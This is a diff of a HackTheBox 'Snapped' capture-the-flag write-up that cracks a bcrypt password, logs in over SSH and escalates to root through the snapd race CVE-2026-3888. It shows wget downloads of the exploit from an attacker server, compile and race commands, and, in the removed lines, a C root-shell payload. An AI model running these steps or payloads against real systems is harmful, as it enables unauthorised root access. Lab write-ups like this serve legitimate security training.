@@ -219,12 +219,13 @@ Save to `hash.txt` and run Hashcat. Bcrypt (mode 3200) is computationally expens
 ```bash
 hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
 ```
+<img width="1200" height="517" alt="image" src="https://github.com/user-attachments/assets/09a28c69-478a-4e6a-a8f9-5d1a9fa75b07" />
 
-[Screenshot: Hashcat running against the bcrypt hash with rockyou.txt]
 
 The hash cracks to: **linkinpark**
 
-[Screenshot: Hashcat showing cracked result — hash:linkinpark]
+<img width="660" height="381" alt="image" src="https://github.com/user-attachments/assets/804199c5-6a03-4104-b9d3-66ffa00f9f48" />
+
 
 ---
 
@@ -239,7 +240,8 @@ ssh jonathan@snapped.htb
 cat /home/jonathan/user.txt
 ```
 
-[Screenshot: SSH session — whoami returning jonathan, user.txt flag visible]
+<img width="956" height="455" alt="image" src="https://github.com/user-attachments/assets/d4f79b85-be44-436d-b7dc-dac033d39947" />
+
 
 **User flag captured.**
 
@@ -278,7 +280,8 @@ kernel  6.8.0-52-generic
 snap list
 ```
 
-[Screenshot: snap version and snap list output confirming snapd 2.63.1 and installed snaps]
+<img width="720" height="176" alt="image" src="https://github.com/user-attachments/assets/be30f2ce-9f21-4c74-a7dd-c97b4c4587bd" />
+
 
 The presence of a SUID-root `snap-confine` binary is the core precondition for the privilege escalation:
 
@@ -287,143 +290,142 @@ find / -name snap-confine -perm -4000 2>/dev/null
 ls -la /usr/lib/snapd/snap-confine
 ```
 
-[Screenshot: snap-confine located with SUID bit set and owned by root]
+<img width="576" height="99" alt="image" src="https://github.com/user-attachments/assets/59416317-7b3e-4aa1-a80b-45a572ae15ab" />
+
 
 ---
 
 ## 7. Privilege Escalation — CVE-2026-3888 (snapd TOCTOU Race Condition)
-
+ 
 ### Vulnerability Explanation
-
+ 
 CVE-2026-3888 is a **TOCTOU (Time-of-Check to Time-of-Use)** race condition in snapd, discovered by the Qualys Threat Research Unit. It exploits a timing conflict between two trusted system components:
-
-**snap-confine** is a SUID-root binary responsible for setting up execution sandboxes for snap applications. When a snap app launches, `snap-confine` creates a private working directory under `/tmp/snap.*/` and uses it during the bind-mount sequence that builds the sandbox's mount namespace.
-
-**systemd-tmpfiles** periodically cleans up stale temporary directories — including those left by snap after a crash or incomplete launch.
-
-**The race condition:** After `systemd-tmpfiles` deletes the `/tmp/snap.*` directory, there is a window before `snap-confine` recreates it where an attacker can create the directory themselves with attacker-controlled content. If the attacker wins the race, `snap-confine` proceeds to use the poisoned directory as trusted, performing bind-mounts against attacker-controlled files.
-
-By replacing `ld-linux-x86-64.so.2` (the dynamic linker) inside the poisoned directory with a malicious shared object, and using an **AF_UNIX socket backpressure** trick to slow down `snap-confine`'s execution timing, the attacker forces the SUID-root binary to load and execute the malicious linker — resulting in a root shell.
-
-### Downloading the Exploit
-
+ 
+**snap-confine** is a SUID-root binary that builds execution sandboxes for snap applications. When a snap launches, `snap-confine` initializes a working directory under `/tmp/.snap/` and uses it during the bind-mount sequence that constructs the sandbox.
+ 
+**systemd-tmpfiles** periodically cleans up stale temporary directories — including `/tmp/.snap` left behind by snap after a crash or incomplete launch.
+ 
+**The race:** When `systemd-tmpfiles` deletes `/tmp/.snap`, there is a brief window before `snap-confine` recreates it. If the attacker manually deletes `/tmp/.snap` at the right moment and wins that window, `snap-confine` — running as root — proceeds to bind-mount the attacker-controlled directory, enabling full privilege escalation.
+ 
+### Step 1 — Compile the Exploit on Your Attacker Machine
+ 
+The exploit consists of two compiled C files. Both are compiled **on the attacker machine** to avoid needing gcc on the target.
+ 
+Obtain the PoC from the public advisory repo, then compile:
+ 
 ```bash
-# On attacker machine — set up a Python HTTP server to transfer the exploit
+# On attacker machine
+gcc -O2 -static -o exploit exploit_suid.c
+gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell_suid.c
+```
+ 
+<img width="683" height="101" alt="image" src="https://github.com/user-attachments/assets/c2581344-0324-439e-adc0-7adc4050d85a" />
+
+ 
+### Step 2 — Transfer Both Files to the Target
+ 
+Start an HTTP server on the attacker machine from the directory containing the compiled files:
+ 
+```bash
+# Attacker machine
 python3 -m http.server 8080
-
-# On target machine
-cd /tmp
-wget http://YOUR_IP:8080/exploit.py
-chmod +x exploit.py
 ```
-
-[Screenshot: Exploit file transferred to /tmp on target]
-
-### Building the Malicious Shared Object
-
-The exploit compiles a malicious shared object (`librootshell.so`) that will be loaded by the SUID `snap-confine` binary when the race is won. The payload executes a root shell:
-
-```c
-// rootshell.c — compiled into librootshell.so
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-
-void __attribute__((constructor)) init() {
-    setuid(0);
-    setgid(0);
-    system("/bin/bash -p");
-}
-```
-
+ 
+On the target machine as jonathan:
+ 
 ```bash
-gcc -shared -fPIC -o librootshell.so rootshell.c -nostartfiles
+# Target machine
+wget http://10.10.14.8:8080/exploit -O ~/exploit
+wget http://10.10.14.8:8080/librootshell.so -O ~/librootshell.so
+chmod +x ~/exploit
 ```
+ 
+<img width="1882" height="369" alt="image" src="https://github.com/user-attachments/assets/f2c814bd-8eb4-48cc-b431-fbcfd8e8bfdf" />
 
-[Screenshot: GCC compiling librootshell.so successfully]
-
-### Running the Race Condition Exploit
-
-The exploit targets a snap application installed on the system (e.g., Firefox) to trigger `snap-confine`. In one terminal, start the exploit loop:
-
+ 
+### Step 3 — Open Two SSH Sessions
+ 
+This exploit requires two simultaneous terminal sessions on the target. Open a second terminal on your attacker machine and SSH in again as jonathan:
+ 
 ```bash
-python3 exploit.py --snap firefox --payload librootshell.so
+ssh jonathan@snapped.htb
 ```
-
-Expected output during a successful run:
-
+ 
+**Session 1** runs the exploit and waits.
+**Session 2** manually triggers the cleanup at the right moment.
+ 
+### Step 4 — Run the Exploit (Session 1)
+ 
+```bash
+~/exploit ~/librootshell.so
+```
+ 
+The exploit will start polling and print output like:
+ 
 ```text
-[*] CVE-2026-3888 — firefox 24.04 helper
-[*] Setting up .snap and .exchange directory...
-[*] Exchange dir ready: 285 entries in .snap/usr/lib/x86_64-linux-gnu.exchange
-[*] Starting race against snap-confine...
-[*] Reading snap-confine output (PID 11301)...
-DEBUG: initializing mount namespace: firefox ...
-[!] TRIGGER DETECTED! Swapping .exchange...
-[+] SWAP DONE! Race won.
+[*] CVE-2026-3888
+[*] Polling for /tmp/.snap cleanup window...
 ```
+ 
+Leave this running and switch to Session 2.
+ 
+<img width="526" height="194" alt="image" src="https://github.com/user-attachments/assets/d9304792-72f8-45db-a5ce-9b785decf710" />
 
-[Screenshot: Exploit running — showing race loop iterations and TRIGGER DETECTED output]
-
-### Confirming the Swap
-
-Once the race is won, verify the dynamic linker in the snap process namespace is now owned by `jonathan` (meaning it was successfully replaced):
-
+ 
+### Step 5 — Trigger the Cleanup (Session 2)
+ 
+Once the exploit is polling in Session 1, manually delete `/tmp/.snap` in Session 2 to simulate the `systemd-tmpfiles` cleanup and open the race window:
+ 
 ```bash
-SPID=$(pgrep -f "sleep 99994" | head -1)
-stat -c '%U' /proc/$SPID/root/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
-# Returns: jonathan
+rm -rf /tmp/.snap
 ```
+ 
+Switch back to Session 1 and watch for the exploit to win the race.
+ 
+<img width="316" height="38" alt="image" src="https://github.com/user-attachments/assets/971f29df-350b-44ea-81c4-f7f6c9410427" />
 
-[Screenshot: stat output confirming the dynamic linker is now owned by jonathan]
-
-### Writing the Payload and Triggering Root
-
-Navigate into the snap process's `/proc` namespace root and write the malicious shared object over the dynamic linker:
-
+ 
+### Step 6 — Root Shell
+ 
+When the race is won, Session 1 will drop into a root shell via the Firefox snap's bash binary:
+ 
 ```bash
-cd /proc/$SPID/root
-cp /usr/bin/busybox ./tmp/sh
-cat ~/librootshell.so > ./usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
-```
-
-[Screenshot: cp and cat commands executing inside /proc namespace root]
-
-The SUID `snap-confine` binary now loads the poisoned linker and executes the constructor function as root.
-
-### Root Shell
-
-```bash
+/var/snap/firefox/common/bash -p
 whoami
 # root
-
+```
+ 
+```bash
 cat /root/root.txt
 ```
+ 
+<img width="274" height="100" alt="image" src="https://github.com/user-attachments/assets/0f707943-4fd0-44eb-ac7c-475da8bdcdb9" />
 
-[Screenshot: Terminal showing root shell — whoami returning root and root.txt flag visible]
-
+ 
 **Root flag captured.**
-
+ 
 ---
-
+ 
 ## Lessons Learned
-
-**Self-defeating encryption is worse than no encryption.** CVE-2026-27944 is a textbook example of security theater — the application encrypted its backup but included the decryption key in the same response. In a real engagement, any endpoint returning sensitive material alongside its own decryption mechanism is an automatic critical finding regardless of the encryption algorithm used.
-
-**TOCTOU vulnerabilities in privileged binaries have an outsized blast radius.** CVE-2026-3888 demonstrates why race conditions in SUID binaries are treated as high-severity even when the window is narrow. The combination of a trusted cleanup daemon (systemd-tmpfiles), a privileged binary with filesystem assumptions (snap-confine), and an attacker-controlled timing mechanism (AF_UNIX socket backpressure) creates a fully reliable exploit chain on default Ubuntu installations.
-
-**Subdomain enumeration is not optional.** The entire attack path began with discovering `admin.snapped.htb`. The main domain was a dead end. Without virtual host fuzzing, the Nginx-UI panel — and with it the entire vulnerability chain — would have been invisible.
-
-**Bcrypt does not compensate for weak passwords.** The hash was bcrypt with a cost factor of 10, which is correctly configured. The password (`linkinpark`) was in rockyou.txt. Algorithm strength is irrelevant if the underlying secret is weak. Password spray / credential cracking is always worth attempting against recovered hashes regardless of the hashing algorithm.
-
-**Snapd and systemd-tmpfiles interactions are a meaningful attack surface on Ubuntu.** Any Ubuntu system running snapd with snaps installed should be assessed for snap version during privilege escalation enumeration. CVE-2026-3888 affects Ubuntu 16.04 through 24.04 LTS and is fixed only in snapd >= 2.73.
-
+ 
+**Self-defeating encryption is worse than no encryption.** CVE-2026-27944 is a textbook example of security theater — the application encrypted its backup but included the decryption key in the same unauthenticated response. In a real engagement, any endpoint returning sensitive material alongside its own decryption mechanism is an automatic critical finding regardless of the encryption algorithm used.
+ 
+**TOCTOU vulnerabilities in SUID binaries have an outsized blast radius.** CVE-2026-3888 shows why race conditions involving root-owned binaries are treated as high-severity even when the window is narrow. The interaction between `systemd-tmpfiles` and `snap-confine` is a default behavior on every Ubuntu system running snapd — no misconfiguration required.
+ 
+**Subdomain enumeration is not optional.** The entire attack path began with discovering `admin.snapped.htb`. The main domain was a dead end. Without virtual host fuzzing, the Nginx-UI panel and the entire CVE chain would have been invisible.
+ 
+**Bcrypt does not compensate for weak passwords.** The hash was bcrypt with cost factor 10 — correctly configured. The password (`linkinpark`) was in rockyou.txt. Algorithm strength is irrelevant if the underlying secret is weak. Always attempt hash cracking regardless of algorithm.
+ 
+**Check snapd version on every Ubuntu target.** CVE-2026-3888 affects Ubuntu 16.04 through 24.04 LTS with snapd below 2.73. It requires no special permissions — any local user with a snap installed is a viable attack path.
+ 
 ---
-
+ 
 ## References
-
+ 
 - [CVE-2026-27944 — Nginx-UI Backup Disclosure](https://nvd.nist.gov/vuln/detail/CVE-2026-27944)
-- [CVE-2026-3888 — Qualys TRU Advisory](https://www.qualys.com/2026/03/CVE-2026-3888)
-- [HTB Official CVE Breakdown — War Room](https://www.hackthebox.com/blog/CVE-2026-27944-CVE-2026-3888)
+- [CVE-2026-3888 — Qualys TRU Advisory](https://blog.qualys.com/vulnerabilities-threat-research/2026/03/17/cve-2026-3888-important-snap-flaw-enables-local-privilege-escalation-to-root)
+- [HTB Official CVE Breakdown](https://www.hackthebox.com/blog/CVE-2026-27944-CVE-2026-3888)
+- [karimelsheikh1 — HTB Snapped Writeup](https://github.com/karimelsheikh1/HTB-Snapped-Writeup)
 - [Nginx-UI GitHub](https://github.com/0xJacky/nginx-ui)
 - [HackTheBox — Snapped](https://www.hackthebox.com/machines/snapped)
+ 
